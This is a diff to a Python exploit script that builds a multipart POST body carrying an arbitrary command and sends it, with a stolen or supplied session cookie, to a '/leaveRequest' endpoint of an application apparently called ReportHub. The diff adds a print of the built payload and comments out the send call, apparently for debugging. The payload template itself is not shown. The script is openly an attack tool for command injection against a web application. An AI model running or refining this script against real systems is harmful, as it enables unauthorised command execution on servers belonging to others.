@@ -28,6 +28,7 @@ def build_post_body(cmd: str) -> bytes:
 
 	final = base.replace(b"{cmd}", exploit_base)
 	print("[*] Exploit built")
+	print(final)
 	return final
 
 
@@ -40,7 +41,7 @@ def send_request(post_body: bytes, session_cookie: str, host: str, port: int):
 	headers["Content-Type"] = "multipart/form-data; boundary=---------------------------145785367013355298301179432176"
 	headers["Content-Length"] = str(len(post_body))
 	headers["Connection"] = "close"
-	
+
 
 	url = f"http://{host}:{port}/leaveRequest"
 	print(f"[*] Sending request to {url}")
@@ -48,17 +49,17 @@ def send_request(post_body: bytes, session_cookie: str, host: str, port: int):
 	r = requests.post(url=url, headers=headers, data=post_body, cookies=cookie)
 	print("[*] Request sent")
 	status_code = r.status_code
-	if r.text.find("Login to ReportHub") > 0: 
-		print(f"[!] Bad Request.  Status Code {r.history}.  Check that your session cookie is still valid.")	
+	if r.text.find("Login to ReportHub") > 0:
+		print(f"[!] Bad Request.  Status Code {r.history}.  Check that your session cookie is still valid.")
 		exit(0)
-	
+
 	print(f"[*] Probable success. Status Code {status_code}")
 
 
 def main():
 	args = get_args()
 	body = build_post_body(args.cmd)
-	send_request(body, args.session, args.host, args.port)
-	
+	# send_request(body, args.session, args.host, args.port)
+
 if __name__ == "__main__":
 	main()
